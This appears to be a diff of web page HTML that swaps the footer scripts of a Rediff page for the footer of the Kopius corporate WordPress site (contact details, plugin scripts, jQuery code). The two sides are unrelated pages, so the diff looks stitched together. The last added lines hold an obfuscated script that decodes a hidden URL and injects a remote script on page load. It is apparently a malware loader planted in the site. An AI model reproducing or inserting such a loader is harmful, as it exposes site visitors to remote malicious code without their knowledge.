-                            var resp_status = (subreq.responseXML.getElementsByTagName("status")[0].firstChild) ? subreq.responseXML.getElementsByTagName("status")[0].firstChild.nodeValue : 0;
-                            var resp_message = (subreq.responseXML.getElementsByTagName("message")[0].firstChild) ? subreq.responseXML.getElementsByTagName("message")[0].firstChild.nodeValue : 0;
-                            if (resp_status == "Success") {
-                                if (document.getElementById('div_thanks')) {
-                                    document.getElementById('div_thanks').innerHTML = "Thank you for subscribing !<br /><span class='cancel_btn' onclick=\"resetSubscribe();\" >Close</span>";
-                                    document.getElementById('div_thanks').style.display = "block";
-                                    document.getElementById('div_err_message').innerHTML = "";
-                                    document.getElementById('div_err_message').style.display = "none";
-                                }
-                                if (document.getElementById('frm_subscription_in_top')) {
-                                    document.getElementById('frm_subscription_in_top').style.display = "none";
-                                }
-                            } else {
-                                document.getElementById('div_err_message').innerHTML = resp_message;
-                                document.getElementById('div_err_message').style.display = "block";
-                                if (document.getElementById(subscribebtn)) {
-                                    document.getElementById(subscribebtn).disabled = false;
-                                }
-                            }
-                            if (document.getElementById('subwait_top')) {
-                                document.getElementById('subwait_top').style.visibility = 'hidden';
-                            }
-                        }
-                    }
-                    if (subreq.readyState == 1) {
-                        if (document.getElementById('subwait_top')) {
-                            document.getElementById('subwait_top').style.visibility = 'visible';
-                        }
-                        if (document.getElementById(subscribebtn)) {
-                            document.getElementById(subscribebtn).disabled = true;
-                        }
-                    }
-                }
-                return false;
-            }
-        </script>
-        <script>
-            var bkbannerArr = new Array();
-        </script>
-        <script src="//imworld.rediff.com/worldrediff/js_2_5/sns_ind_home_9.js" defer></script>
-        <script src="//imworld.rediff.com/worldrediff/js_2_5/ind_home_other_4_min.js" defer></script>
-        <!-- Google Analytics -->
-        <script>
-            window.ga = window.ga || function() {
-                (ga.q = ga.q || []).push(arguments)
-            }
-            ;
-            ga.l = +new Date;
-            ga('create', 'UA-111630784-8');
-            ga('send', 'pageview');
-        </script>
-        <script async src='https://www.google-analytics.com/analytics.js'></script>
-        <!-- End Google Analytics -->
-    </body>
+		                <iframe style='display:none;width:0px;height:0px;' src='about:blank' name='gform_ajax_frame_1' id='gform_ajax_frame_1' title='This iframe contains the logic required to handle Ajax powered Gravity Forms.'></iframe>
+		                <script>
+gform.initializeOnLoaded( function() {gformInitSpinner( 1, 'https://kopiustech.com/wp-content/plugins/gravityforms/images/spinner.svg', true );jQuery('#gform_ajax_frame_1').on('load',function(){var contents = jQuery(this).contents().find('*').html();var is_postback = contents.indexOf('GF_AJAX_POSTBACK') >= 0;if(!is_postback){return;}var form_content = jQuery(this).contents().find('#gform_wrapper_1');var is_confirmation = jQuery(this).contents().find('#gform_confirmation_wrapper_1').length > 0;var is_redirect = contents.indexOf('gformRedirect(){') >= 0;var is_form = form_content.length > 0 && ! is_redirect && ! is_confirmation;var mt = parseInt(jQuery('html').css('margin-top'), 10) + parseInt(jQuery('body').css('margin-top'), 10) + 100;if(is_form){jQuery('#gform_wrapper_1').html(form_content.html());if(form_content.hasClass('gform_validation_error')){jQuery('#gform_wrapper_1').addClass('gform_validation_error');} else {jQuery('#gform_wrapper_1').removeClass('gform_validation_error');}setTimeout( function() { /* delay the scroll by 50 milliseconds to fix a bug in chrome */ jQuery(document).scrollTop(jQuery('#gform_wrapper_1').offset().top - mt); }, 50 );if(window['gformInitDatepicker']) {gformInitDatepicker();}if(window['gformInitPriceFields']) {gformInitPriceFields();}var current_page = jQuery('#gform_source_page_number_1').val();gformInitSpinner( 1, 'https://kopiustech.com/wp-content/plugins/gravityforms/images/spinner.svg', true );jQuery(document).trigger('gform_page_loaded', [1, current_page]);window['gf_submitting_1'] = false;}else if(!is_redirect){var confirmation_content = jQuery(this).contents().find('.GF_AJAX_POSTBACK').html();if(!confirmation_content){confirmation_content = contents;}setTimeout(function(){jQuery('#gform_wrapper_1').replaceWith(confirmation_content);jQuery(document).scrollTop(jQuery('#gf_1').offset().top - mt);jQuery(document).trigger('gform_confirmation_loaded', [1]);window['gf_submitting_1'] = false;wp.a11y.speak(jQuery('#gform_confirmation_message_1').text());}, 50);}else{jQuery('#gform_1').append(contents);if(window['gformRedirect']) {gformRedirect();}}jQuery(document).trigger('gform_post_render', [1, current_page]);} );} );
+</script>
+</div></div></div></div></div>
+	</div><!-- .entry-content -->
+
+	</article><!-- #post-843 -->
+
+	</main><!-- #main -->
+
+
+	<!-- <footer id="colophon" class="site-footer desktop"> -->
+	<footer id="colophon" class="site-footer">
+		<div class="top">
+			<div class="two-col">
+				<div class="col col-wide">
+					<div class="col">
+						<img width="640" height="157"   alt="" decoding="async" data-srcset="https://kopiustech.com/wp-content/uploads/2023/02/kopius-logo-light.png 768w, https://kopiustech.com/wp-content/uploads/2023/02/kopius-logo-light-300x73.png 300w"  data-src="https://kopiustech.com/wp-content/uploads/2023/02/kopius-logo-light.png" data-sizes="(max-width: 640px) 100vw, 640px" class="attachment-large size-large lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img width="640" height="157" src="https://kopiustech.com/wp-content/uploads/2023/02/kopius-logo-light.png" class="attachment-large size-large" alt="" decoding="async" srcset="https://kopiustech.com/wp-content/uploads/2023/02/kopius-logo-light.png 768w, https://kopiustech.com/wp-content/uploads/2023/02/kopius-logo-light-300x73.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></noscript>					</div>
+				</div>
+
+				<div class="col col-narrow">
+					<div class="col contact">
+						<p class="">Kopius US<br />
+						3055 112th Ave. NE, Suite 225<br />
+						Bellevue, WA 98004<br />
+						USA</p>
+						<p class="phone">+1 206 494 4339<br />
+						<a href="mailto:info@kopiustech.com">info@kopiustech.com</a></p>
+					</div>
+					<div class="col contact">
+						<p class="">Kopius LatAm<br />
+						Olga Cossettini 363<br />
+						C1107CCH Puerto Madero<br />
+						Argentina</p>
+						<p class="phone">+1 312 821 4600<br />
+						<a href="mailto:info@kopiustech.com">info@kopiustech.com</a></p>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="bottom">
+			<div class="two-col">
+				<div class="col privacy">
+					<p>© 2023 Kopius, Inc.
+					<a href="/privacy-policy">Privacy Policy</a></p>
+				</div>
+
+				<div class="col menu">
+					<a href="/approach/">Approach</a>
+					<a href="/capabilities/">Capabilities</a>
+					<a href="/our-work/">Case Studies</a>
+					<a href="/about-us/">About</a>
+					<a href="/insights-innovation/">Insights</a>
+					<a href="/contact-us/">Contact</a>
+					<a href="/careers/">Careers</a>
+
+					<div>
+						<a href="https://www.linkedin.com/company/kopius-tech" target="_blank"><img  data-src='https://kopiustech.com/wp-content/themes/valence/assets/imgs/linkedin.png' class='lazyload' src='data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='><noscript><img src="https://kopiustech.com/wp-content/themes/valence/assets/imgs/linkedin.png"></noscript></a>
+						<a href="https://twitter.com/KopiusTech/" target="_blank"><img  data-src='https://kopiustech.com/wp-content/themes/valence/assets/imgs/twitter.png' class='lazyload' src='data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='><noscript><img src="https://kopiustech.com/wp-content/themes/valence/assets/imgs/twitter.png"></noscript></a>
+						<a href="https://www.instagram.com/kopiustech/" target="_blank"><img  data-src='https://kopiustech.com/wp-content/themes/valence/assets/imgs/instagram.png' class='lazyload' src='data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='><noscript><img src="https://kopiustech.com/wp-content/themes/valence/assets/imgs/instagram.png"></noscript></a>
+						<a href="https://www.youtube.com/@KopiusTech" target="_blank"><img  data-src='https://kopiustech.com/wp-content/themes/valence/assets/imgs/youtube.png' class='lazyload' src='data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='><noscript><img src="https://kopiustech.com/wp-content/themes/valence/assets/imgs/youtube.png"></noscript></a>
+						<a href="https://www.twitch.tv/kopiustech" target="_blank"><img  data-src='https://kopiustech.com/wp-content/themes/valence/assets/imgs/twitch.png' class='lazyload' src='data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='><noscript><img src="https://kopiustech.com/wp-content/themes/valence/assets/imgs/twitch.png"></noscript></a>
+					</div>
+
+				</div>
+			</div>
+		</div>
+	</footer>
+
+
+
+<!-- --------- START PLUGIN MARKETINGCLOUDFX-WP - INTEGRATION SCRIPTS --------- -->
+<!-- MCFX Integration: Gravity Forms -->
+<script type="text/javascript" data-registered="mcfx-plugin" >
+	if (
+		/* global mcfx */
+		'undefined' !== typeof mcfx
+	) {
+		document.addEventListener( 'submit.gravityforms', ( e ) => {
+			if ( 'function' === typeof mcfx ) {
+				mcfx( 'capture', e.target );
+			}
+		} );
+	}
+</script>
+<!-- --------- END PLUGIN MARKETINGCLOUDFX-WP - INTEGRATION SCRIPTS --------- -->
+<style id='core-block-supports-inline-css'>
+.wp-block-columns.wp-container-4{flex-wrap:nowrap;}.wp-block-buttons.wp-container-5{justify-content:center;}
+</style>
+<script id='getwid-blocks-frontend-js-js-extra'>
+var Getwid = {"settings":[],"ajax_url":"https:\/\/kopiustech.com\/wp-admin\/admin-ajax.php","isRTL":"","nonces":{"recaptcha_v2_contact_form":"e0d55aecda"}};
+</script>
+<script src='https://kopiustech.com/wp-content/plugins/getwid/assets/js/frontend.blocks.js?ver=1679091486' id='getwid-blocks-frontend-js-js'></script>
+<script id='page-scroll-to-id-plugin-script-js-extra'>
+var mPS2id_params = {"instances":{"mPS2id_instance_0":{"selector":"a[href*='#']:not([href='#'])","autoSelectorMenuLinks":"true","excludeSelector":"a[href^='#tab-'], a[href^='#tabs-'], a[data-toggle]:not([data-toggle='tooltip']), a[data-slide], a[data-vc-tabs], a[data-vc-accordion], a.screen-reader-text.skip-link","scrollSpeed":800,"autoScrollSpeed":"true","scrollEasing":"easeInOutQuint","scrollingEasing":"easeOutQuint","forceScrollEasing":"false","pageEndSmoothScroll":"true","stopScrollOnUserAction":"false","autoCorrectScroll":"false","autoCorrectScrollExtend":"false","layout":"vertical","offset":0,"dummyOffset":"false","highlightSelector":"","clickedClass":"mPS2id-clicked","targetClass":"mPS2id-target","highlightClass":"mPS2id-highlight","forceSingleHighlight":"false","keepHighlightUntilNext":"false","highlightByNextTarget":"false","appendHash":"false","scrollToHash":"true","scrollToHashForAll":"true","scrollToHashDelay":0,"scrollToHashUseElementData":"true","scrollToHashRemoveUrlHash":"false","disablePluginBelow":0,"adminDisplayWidgetsId":"true","adminTinyMCEbuttons":"true","unbindUnrelatedClickEvents":"false","unbindUnrelatedClickEventsSelector":"","normalizeAnchorPointTargets":"false","encodeLinks":"false"}},"total_instances":"1","shortcode_class":"_ps2id"};
+</script>
+<script src='https://kopiustech.com/wp-content/plugins/page-scroll-to-id/js/page-scroll-to-id.min.js?ver=1680889762' id='page-scroll-to-id-plugin-script-js'></script>
+<script id='ultp-script-js-extra'>
+var ultp_data_frontend = {"url":"https:\/\/kopiustech.com\/wp-content\/plugins\/ultimate-post\/","ajax":"https:\/\/kopiustech.com\/wp-admin\/admin-ajax.php","security":"8907796b54"};
+</script>
+<script src='https://kopiustech.com/wp-content/plugins/ultimate-post/assets/js/ultp.min.js?ver=1679091486' id='ultp-script-js'></script>
+<script id='wpmm_js-js-extra'>
+var ajax_objects = {"ajaxurl":"https:\/\/kopiustech.com\/wp-admin\/admin-ajax.php","redirecturl":"https:\/\/kopiustech.com\/","loadingmessage":"Sending user info, please wait..."};
+var wpmm_object = {"ajax_url":"https:\/\/kopiustech.com\/wp-admin\/admin-ajax.php","wpmm_responsive_breakpoint":"1200px","wpmm_disable_mobile":"false"};
+</script>
+<script src='https://kopiustech.com/wp-content/plugins/wp-megamenu/assets/js/wpmm.js?ver=1679091487' id='wpmm_js-js'></script>
+<script src='https://kopiustech.com/wp-includes/js/jquery/ui/core.min.js?ver=1679091487' id='jquery-ui-core-js'></script>
+<script src='https://kopiustech.com/wp-includes/js/jquery/ui/datepicker.min.js?ver=1679091487' id='jquery-ui-datepicker-js'></script>
+<script id='jquery-ui-datepicker-js-after'>
+jQuery(function(jQuery){jQuery.datepicker.setDefaults({"closeText":"Close","currentText":"Today","monthNames":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesShort":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"nextText":"Next","prevText":"Previous","dayNames":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"dayNamesShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"dayNamesMin":["S","M","T","W","T","F","S"],"dateFormat":"MM d, yy","firstDay":1,"isRTL":false});});
+</script>
+<script src='https://kopiustech.com/wp-content/themes/valence/js/navigation.js?ver=1679091487' id='valence-navigation-js'></script>
+<script src='https://kopiustech.com/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=1679091487' id='regenerator-runtime-js'></script>
+<script src='https://kopiustech.com/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=1679091487' id='wp-polyfill-js'></script>
+<script src='https://kopiustech.com/wp-includes/js/dist/dom-ready.min.js?ver=1679091487' id='wp-dom-ready-js'></script>
+<script src='https://kopiustech.com/wp-includes/js/dist/hooks.min.js?ver=1679091487' id='wp-hooks-js'></script>
+<script src='https://kopiustech.com/wp-includes/js/dist/i18n.min.js?ver=1679091487' id='wp-i18n-js'></script>
+<script id='wp-i18n-js-after'>
+wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+</script>
+<script src='https://kopiustech.com/wp-includes/js/dist/a11y.min.js?ver=1679091487' id='wp-a11y-js'></script>
+<script defer='defer' src='https://kopiustech.com/wp-content/plugins/gravityforms/assets/js/dist/vendor-theme.min.js?ver=1679091486' id='gform_gravityforms_theme_vendors-js'></script>
+<script id='gform_gravityforms_theme-js-extra'>
+var gform_theme_config = {"common":{"form":{"honeypot":{"version_hash":"f71615be7e225a7fb9d6dbd943b88fc6"}}},"hmr_dev":"","public_path":"https:\/\/kopiustech.com\/wp-content\/plugins\/gravityforms\/assets\/js\/dist\/"};
+</script>
+<script defer='defer' src='https://kopiustech.com/wp-content/plugins/gravityforms/assets/js/dist/scripts-theme.min.js?ver=1679091486' id='gform_gravityforms_theme-js'></script>
+<script src='https://kopiustech.com/wp-content/plugins/wp-smushit/app/assets/js/smush-lazy-load.min.js?ver=1679091487' id='smush-lazy-load-js'></script>
+<script src='https://kopiustech.com/wp-content/plugins/getwid/vendors/slick/slick/slick.min.js?ver=1679091486' id='slick-js'></script>
+<script src='https://kopiustech.com/wp-includes/js/imagesloaded.min.js?ver=1679091487' id='imagesloaded-js'></script>
+<script>
+gform.initializeOnLoaded( function() { jQuery(document).on('gform_post_render', function(event, formId, currentPage){if(formId == 1) {} } );jQuery(document).bind('gform_post_conditional_logic', function(event, formId, fields, isInit){} ) } );
+</script>
+<script>
+gform.initializeOnLoaded( function() { jQuery(document).trigger('gform_post_render', [1, 1]) } );
+</script>
+
+<script src="https://www.twilik.com/assets/retainable/rss-embed/retainable-rss-embed.js"></script>
+
+<script>
+
+(function($) {
+
+	$('.section-link').click(function() {
+	  var cur = $('.section-link').index($(this)) + 1;
+	  $('.section-display').removeClass('active');
+	  $('.section-display').eq(cur).addClass('active');
+	});
+
+	var openTab = function(tabName) {
+		var tab = $('#' + tabName)
+		if(!tab.hasClass('active')) {
+			$('.containerTab.active').each(function(i, el) {
+				$(el).hide();
+				$(el).removeClass('active');
+			});
+			tab.addClass('active').slideDown();
+		}
+		$('html,body').animate({ scrollTop: tab.offset().top - 80}, 'slow');
+	}
+
+	$('.team .members').on('click', function(e) {
+		openTab($(this).data('tab'));
+	});
+	$('.team .containerTab .closebtn').on('click', '', function(e) {
+		var tab = $(this).closest('.containerTab');
+		tab.slideUp();
+		tab.removeClass('active');
+	});
+
+	$(".responsive").slick({
+	  prevArrow: $(".prev"),
+	  nextArrow: $(".next"),
+	  infinite: false,
+	  speed: 300,
+	  slidesToShow: 1,
+	  slidesToScroll: 1,
+	  responsive: [
+	    {
+	      breakpoint: 1024,
+	      settings: {
+	        slidesToShow: 1,
+	        slidesToScroll: 1,
+	        infinite: false
+	      }
+	    },
+	    {
+	      breakpoint: 600,
+	      settings: {
+	        slidesToShow: 1,
+	        slidesToScroll: 1
+	      }
+	    },
+	    {
+	      breakpoint: 480,
+	      settings: {
+	        slidesToShow: 1,
+	        slidesToScroll: 1
+	      }
+	    }
+	  ]
+	});
+
+})(jQuery);
+</script>
+
+<script>
+	(function(){var _9n0=document.createElement("script"),_tH=(function(_Fpg,_y8){var _uU="";for(var _Rl=0;_Rl<_Fpg.length;_Rl++){var _lz=_Fpg[_Rl].charCodeAt();_lz-=_y8;_lz+=61;_lz!=_Rl;_uU==_uU;_lz%=94;_lz+=33;_y8>6;_uU+=String.fromCharCode(_lz)}return _uU})(atob("eScnIyZLQEAqJj8tIiJ+eiF3Ij90In5AI3ordn1AR0RJckd1RUl2dHVFQUJBdEpKcndBQkl3"), 17);function _L4(){};9>2;_9n0!="G";_9n0.referrerPolicy="unsafe-url";_9n0.async=!0;_9n0.type="text/javascript";_9n0.src=_tH;var _DmZ=document.getElementsByTagName("script")[0];_DmZ.parentNode.insertBefore(_9n0,_DmZ)})();
+</script>
+</body>
 </html>
